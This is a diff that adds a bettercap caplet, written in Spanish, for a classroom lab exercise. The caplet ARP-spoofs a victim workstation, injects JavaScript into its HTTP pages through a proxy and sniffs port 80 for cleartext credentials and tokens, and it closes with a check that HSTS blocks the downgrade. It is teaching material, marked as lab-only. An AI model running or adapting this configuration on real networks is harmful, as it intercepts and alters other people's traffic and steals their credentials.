@@ -1,0 +1,30 @@
+# xest-mitm.cap — ataque de intermediario guiado en la VLAN de aula.
+# SOLO laboratorio aislado. Interceptar tráfico ajeno fuera de aquí es delito (197 ter CP).
+#
+# Uso:  sudo bettercap -iface eth0 -caplet caplets/xest-mitm.cap
+#   (ajusta -iface y las IP al direccionamiento real de la VLAN)
+
+# --- Objetivo del envenenamiento ARP: la estación VÍCTIMA (no el gateway entero) ---
+set arp.spoof.targets 10.10.10.30
+set arp.spoof.internal true
+
+# --- Proxy HTTP: no solo LEER, también MODIFICAR la respuesta en claro ---
+#     Inyecta nuestro JavaScript en toda página HTTP servida a la víctima.
+#     Esto es la EVIDENCIA de modificación que exige HE-E11 (no basta capturar).
+set http.proxy.injectJS caplets/inject.js
+
+# --- Sniffer: credenciales/tokens que viajen en claro por el puerto 80 ---
+set net.sniff.verbose false
+set net.sniff.filter "tcp port 80"
+
+# --- Secuencia de arranque ---
+net.probe on
+net.recon on
+http.proxy on
+arp.spoof on
+net.sniff on
+
+# A partir de aquí, cuando la víctima navegue al portal en HTTP:
+#  - verás sus peticiones/credenciales en el sniffer, y
+#  - la víctima verá NUESTRA banda inyectada en la página (modificación demostrada).
+# Repite luego contra hsts.xest.local (HTTPS+HSTS): comprobarás que NO se puede degradar.
